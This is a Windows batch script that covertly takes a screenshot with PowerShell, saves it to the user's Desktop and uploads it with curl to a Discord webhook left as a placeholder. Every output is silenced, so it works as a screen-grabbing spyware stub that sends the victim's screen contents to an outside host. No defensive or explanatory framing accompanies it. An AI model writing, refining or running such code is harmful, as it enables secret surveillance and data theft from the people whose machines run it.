@echo off
set "filename=screenshot.png"
set "discord_webhook_url= YOUR WEBHOOK URL HERE
set "delay_seconds=5"
if exist "%USERPROFILE%\Desktop\%filename%" del "%USERPROFILE%\Desktop\%filename%" >nul
powershell -c "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('^{PRTSC}'); Start-Sleep -Milliseconds 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); $img.Save('%USERPROFILE%\Desktop\%filename%', [System.Drawing.Imaging.ImageFormat]::Png);}" >nul

curl -H "Content-Type: multipart/form-data" -F "file=@%USERPROFILE%\Desktop\%filename%" "%discord_webhook_url%" >nul

echo Done! >nul
